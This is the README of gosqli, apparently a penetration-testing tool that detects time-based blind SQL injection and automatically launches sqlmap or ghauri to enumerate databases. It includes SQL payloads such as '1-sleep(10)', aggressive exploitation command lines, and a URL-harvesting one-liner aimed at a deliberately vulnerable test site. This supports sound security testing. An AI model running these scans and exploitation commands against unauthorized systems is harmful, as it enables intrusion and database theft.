## gosqli

gosqli is a fast and simple tool for detecting blind SQL injection vulnerabilities using time-based techniques. It supports scanning URLs and HTTP request files with custom payloads, parallel requests, response time-based verification, automatic exploitation integration, and output saving capabilities.

## Features

- **Time-based Blind SQL Injection Detection**: Uses response time delays to detect SQL injection vulnerabilities
- **Multiple Input Methods**: 
  - Single URL scanning (`-u`)
  - Multiple URL scanning from file (`-l/--list`)
  - HTTP request file scanning (`-r/--request`) - supports single file or directory
- **Parallel & Concurrent Scanning**: Configurable parallel URL scanning and concurrent payload testing
- **Verification System**: Configurable verification attempts with response time threshold
- **Output Saving**: Automatically saves confirmed SQL injection findings to files
- **Automatic Exploitation**: Integrates with sqlmap and ghauri for automatic exploitation
- **Proxy Support**: Route requests through proxy servers (e.g., Burp Suite)
- **Injection Marker**: Uses `*` as injection marker in URLs, headers, and request body
- **Request File Support**: Parse and test HTTP requests from files with injection markers

## Installation

### Using Go Install
```bash
go install github.com/rix4uni/gosqli@latest
```

### Download Prebuilt Binaries
```
wget https://github.com/rix4uni/gosqli/releases/download/v0.0.2/gosqli-linux-amd64-0.0.2.tgz
tar -xvzf gosqli-linux-amd64-0.0.2.tgz
rm -rf gosqli-linux-amd64-0.0.2.tgz
mv gosqli ~/go/bin/gosqli
```

Or download [binary release](https://github.com/rix4uni/gosqli/releases) for your platform.

### Compile from Source
```
git clone --depth 1 https://github.com/rix4uni/gosqli.git
cd gosqli; go install
```

## Usage

### Flags

#### Input Options
- `-u, --url string`: URL to fetch (must contain `*` as injection marker)
- `-l, --list string`: File containing list of URLs (each URL must contain `*`)
- `-r, --request string`: Load HTTP request from a file or directory (request must contain `*` as injection marker)
- `-p, --payload string`: File containing payloads to test

#### Detection Configuration
- `-m, --mrt int`: Match response time threshold in seconds (default: 10)
- `-v, --verify int`: Number of times to verify "SQLI FOUND" (default: 3)
- `-c, --requiredCount int`: Number of response times greater than responseFlag required for SQLI CONFIRMED (0 means all) (default: 0)
- `-d, --verifydelay int`: Delay in milliseconds between verify attempts (default: 12000)
- `--retries int`: Number of retry attempts for failed HTTP requests (default: 0)
- `--stop int`: Stop checking pending HTTP requests after [stop] confirmed SQL injections (0 means check all) (default: 1)

#### Performance Options
- `-P, --parallel int`: Maximum number of URLs to scan in parallel (default: 1)
- `--concurrency int`: Maximum number of payloads to scan concurrently (default: 20)

#### Output & Integration
- `-o, --output`: Save SQLI CONFIRMED results to files
- `--on-confirmed string`: Tool to use for automatic exploitation when SQLI CONFIRMED: `sqlmap`, `ghauri`, `both`, or `ghauri` (default)

#### Network Options
- `--proxy string`: Proxy URL (e.g., `http://127.0.0.2:8080`)
- `-H string`: Custom User-Agent header for HTTP requests (default: Mozilla/5.0...)

#### Display Options
- `--no-color`: Disable colored output
- `--silent`: Silent mode (suppress banner and info)
- `--version`: Print version and exit

## Usage Examples

### Single URL Scanning
```yaml
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" -p fav-time-based-sqli.txt
```

### Multiple URLs from File
```yaml
# Create URLs file
cat > urls.txt << EOF
http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*
http://testphp.vulnweb.com/artists.php?artist=1*
EOF

# Scan multiple URLs
gosqli -l urls.txt -p fav-time-based-sqli.txt
```

### HTTP Request File Scanning
```yaml
# Single request file
gosqli -r request.txt -p fav-time-based-sqli.txt

# Directory of request files
gosqli -r ./burprequest/ -p fav-time-based-sqli.txt
```

### With Output Saving
```yaml
# Save confirmed SQL injections to files
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" -p fav-time-based-sqli.txt --output
```

### With Automatic Exploitation
```yaml
# Automatically launch ghauri when SQLI CONFIRMED
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" -p fav-time-based-sqli.txt --output --on-confirmed ghauri

# Automatically launch sqlmap when SQLI CONFIRMED
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" -p fav-time-based-sqli.txt --output --on-confirmed sqlmap

# Automatically launch both sqlmap and ghauri
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" -p fav-time-based-sqli.txt --output --on-confirmed both
```

### With Proxy (Burp Suite)
```yaml
gosqli -u "http://testphp.vulnweb.com/AJAX/infocateg.php?id=1*" -p fav-time-based-sqli.txt --proxy http://127.0.0.2:8080
```

### Request File with Output and Exploitation
```yaml
gosqli -r ./burprequest/ -p fav-time-based-sqli.txt --output --on-confirmed ghauri --proxy http://127.0.0.2:8080
```

### Advanced: Parallel Scanning with Custom Settings
```yaml
gosqli -l urls.txt -p fav-time-based-sqli.txt -P 5 --concurrency 50 -m 5 -v 5 -d 10000 --output
```

### Oneliner Workflow
```yaml
# Generate URLs with injection markers and scan
echo "testphp.vulnweb.com" | waybackurls | urldedupe -s | pvreplace -silent -payload "*" -fuzzing-part param-value -fuzzing-type replace -fuzzing-mode single | unew -ef -el -t -i -q urls.txt
gosqli -l urls.txt -p fav-time-based-sqli.txt --output | tee -a gosqli.txt
```

## Output Files

When using the `--output` flag, gosqli saves confirmed SQL injection findings to the following locations:

### Directory Structure
All output files are saved in `~/.config/gosqli/`

### URL-based Scanning (`-u` or `-l`)
- **`sqliconfirmed.burpsuite`**: Contains URLs with actual payloads (for manual testing in Burp Suite)
- **`sqliconfirmed.sqlmap_ghauri`**: Contains URLs with `*` marker (for sqlmap/ghauri exploitation)

### Request File Scanning (`-r`)
- **`sqliconfirmed_request/burpsuite/`**: Contains HTTP request files with actual payloads (for Burp Suite Repeater)
- **`sqliconfirmed_request/sqlmap_ghauri/`**: Contains HTTP request files with `*` marker (for sqlmap/ghauri exploitation)

### Exploitation Logs (`--on-confirmed`)
- **`logs/sqlmap_<timestamp>.log`**: sqlmap exploitation output logs
- **`logs/ghauri_<timestamp>.log`**: ghauri exploitation output logs

Each log file starts with a header indicating the target:
```
URL_FILE: http://example.com/page.php?id=1*
```

or

```
URL_FILE: req.txt
```

## Important Notes

### Injection Marker
- Use `*` (asterisk) as the injection marker in URLs, request headers, or request body
- gosqli will replace `*` with each payload from the payload file
- Example: `http://example.com/page.php?id=1*`

### ADDTIME Placeholder
- Payloads can contain `ADDTIME` placeholder which will be automatically replaced with `10`
- This allows dynamic time delays in payloads
- Example payload: `1-sleep(ADDTIME)` becomes `1-sleep(10)`

### Request File Format
Request files should be in raw HTTP format:
```yaml
GET /page.php?id=1* HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0...
Cookie: session=abc123

```

### Verification System
- When a potential SQL injection is found (`SQLI FOUND`), gosqli verifies it multiple times
- Default verification: 3 attempts with 12 second delay between attempts
- Response time must exceed the threshold (`-m/--mrt`) for confirmation
- Only verified findings are marked as `SQLI CONFIRMED`

### Automatic Exploitation
- When `--on-confirmed` is set, exploitation tools run in the background
- gosqli continues scanning while exploitation runs
- Check log files in `~/.config/gosqli/logs/` for exploitation results
- sqlmap and ghauri must be installed and available in PATH

### sqlmap Integration
- Command: `sqlmap -r <file> --random-agent --level 5 --risk 3 --ignore-code=500 --dbs -time-sec=12 --batch --flush-session`
- Command: `sqlmap -u <url> --random-agent --level 5 --risk 3 --ignore-code=500 --dbs -time-sec=12 --batch --flush-session`

### ghauri Integration
- Command: `ghauri -r <file> --level 3 --dbs --time-sec 12 --batch --flush-session`
- Command: `ghauri -u <url> --level 3 --dbs --time-sec 12 --batch --flush-session`

## Output Examples

### Normal Output
```yaml
NORMAL REQUEST: http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 [200] [nginx/1.19.0] [0.02 s]
NOT FOUND: http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(5) [200] [nginx/1.19.0] [0.01 s]
SQLI FOUND: http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(10) [200] [nginx/1.19.0] [10.01 s]
SQLI CONFIRMED: http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(10) [200] [nginx/1.19.0] [10.03 s, 10.03 s, 10.04 s]
Started ghauri exploitation in background. Log: ~/.config/gosqli/logs/ghauri_20251108_101555.log
```

### Request File Output (with `-r` flag)
```yaml
NORMAL REQUEST: [req2.txt] http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 [200] [nginx/1.19.0] [0.02 s]
NOT FOUND: [req2.txt] http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(5) [200] [nginx/1.19.0] [0.01 s]
SQLI FOUND: [req2.txt] http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(10) [200] [nginx/1.19.0] [10.01 s]
SQLI CONFIRMED: [req2.txt] http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(10) [200] [nginx/1.19.0] [10.03 s, 10.03 s, 10.04 s]
Proxy request sent: [req2.txt] http://testphp.vulnweb.com/AJAX/infocateg.php?id=1-sleep(10) [200] [nginx/1.19.0] [10.03 s, 10.03 s, 10.04 s]
Started ghauri exploitation in background. Log: ~/.config/gosqli/logs/ghauri_20251108_101555.log
```

## Acknowledgments

- Inspired by time-based SQL injection detection techniques
- Integrates with [sqlmap](https://github.com/sqlmapproject/sqlmap) and [ghauri](https://github.com/r0oth3x49/ghauri) for exploitation
